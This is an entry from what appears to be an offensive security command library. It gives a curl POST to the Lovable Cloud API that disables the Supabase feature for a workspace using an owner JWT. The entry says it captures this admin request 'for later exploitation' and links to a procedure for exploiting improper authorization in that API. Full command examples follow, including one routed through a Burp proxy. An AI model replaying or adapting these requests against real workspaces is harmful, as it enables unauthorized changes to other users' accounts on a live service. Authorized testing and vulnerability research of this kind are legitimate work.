---
id: cmd-lovable-admin-disable-001
data: >-
  curl -X POST
  "https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable"
  -H "Authorization: Bearer <OWNER-JWT>" -H "Content-Type: application/json" -d
  '{"approval_preference":"disable"}'
tags:
  - api
  - authorization
  - disable-feature
type: command
output: null
executor: bash
platforms:
  - Web
  - Cloud
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.089Z'
verified: false
validated: true
submitted: true
---
# disable-lovable-cloud-admin

## Command

```bash
curl -X POST "https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer <OWNER-JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Description

This command sends a POST request to the Lovable Cloud API to disable the Supabase/Lovable Cloud feature using an Admin/Owner JWT token. It is used to trigger and capture the legitimate admin action for later exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| WORKSPACE_ID | The ID of the target workspace | Yes |
| OWNER-JWT | Bearer token for Admin/Owner account | Yes |
| approval_preference | Payload value to disable the feature (\"disable\") | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://lovable-api.com/workspaces/abc123/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

### Advanced Usage

Use with proxy like Burp for interception:

```bash
curl -x http://127.0.0.1:8080 -X POST "https://lovable-api.com/workspaces/abc123/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer <OWNER-JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Expected Output

HTTP/2 200 OK response body indicating successful disable, e.g., {"status":"disabled"}. The feature is toggled off for the workspace.

## Related

- [[commands/disable-lovable-cloud-editor]]
- [[procedures/Exploit-Improper-Authorization-in-Lovable-API]]
